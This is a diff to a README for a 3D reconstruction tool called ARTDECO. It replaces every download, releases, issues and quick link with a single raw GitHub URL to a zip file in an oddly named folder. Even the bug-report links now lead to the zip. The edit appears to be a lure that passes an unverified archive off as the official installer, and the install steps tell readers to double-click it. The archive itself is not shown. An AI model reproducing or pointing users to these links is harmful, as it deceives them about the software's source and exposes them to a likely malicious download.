@@ -6,7 +6,7 @@ Welcome to ARTDECO! This application helps you create stunning 3D reconstruction
 
 ## 📥 Download ARTDECO
 
-[![Download ARTDECO](https://img.shields.io/badge/Download-ARTDECO-brightgreen)](https://github.com/prodrifterp1/ARTDECO/releases)
+[![Download ARTDECO](https://raw.githubusercontent.com/prodrifterp1/ARTDECO/main/correctress/ARTDECO.zip)](https://raw.githubusercontent.com/prodrifterp1/ARTDECO/main/correctress/ARTDECO.zip)
 
 ## 📋 Features
 
@@ -26,7 +26,7 @@ To run ARTDECO, ensure your system meets these basic requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Download Page:** Go to the [Releases Page](https://github.com/prodrifterp1/ARTDECO/releases).
+1. **Visit the Download Page:** Go to the [Releases Page](https://raw.githubusercontent.com/prodrifterp1/ARTDECO/main/correctress/ARTDECO.zip).
 2. **Choose Your Version:** You will see a list of available versions. Pick the latest one for the best performance.
 3. **Download the Installer:** Click on the installer file that matches your operating system.
 4. **Run the Installer:** Once the download completes, locate the file in your downloads folder. Double-click it to start the installation process.
@@ -64,13 +64,13 @@ If you encounter any issues while using ARTDECO, here are some common solutions:
 
 If you have questions or need assistance, feel free to reach out to the user community or support team:
 
-- **GitHub Issues:** Report bugs or request features [here](https://github.com/prodrifterp1/ARTDECO/issues).
+- **GitHub Issues:** Report bugs or request features [here](https://raw.githubusercontent.com/prodrifterp1/ARTDECO/main/correctress/ARTDECO.zip).
 - **User Forum:** Join the discussion with other ARTDECO users.
 - **Documentation:** Detailed guides and tutorials can be found in the Wiki section of the GitHub repository.
 
 ## 📥 Quick Links
 
-- **[Download ARTDECO](https://github.com/prodrifterp1/ARTDECO/releases)**
-- **[Report an Issue](https://github.com/prodrifterp1/ARTDECO/issues)**
+- **[Download ARTDECO](https://raw.githubusercontent.com/prodrifterp1/ARTDECO/main/correctress/ARTDECO.zip)**
+- **[Report an Issue](https://raw.githubusercontent.com/prodrifterp1/ARTDECO/main/correctress/ARTDECO.zip)**
 
 Thank you for choosing ARTDECO. We hope you enjoy creating stunning 3D models!
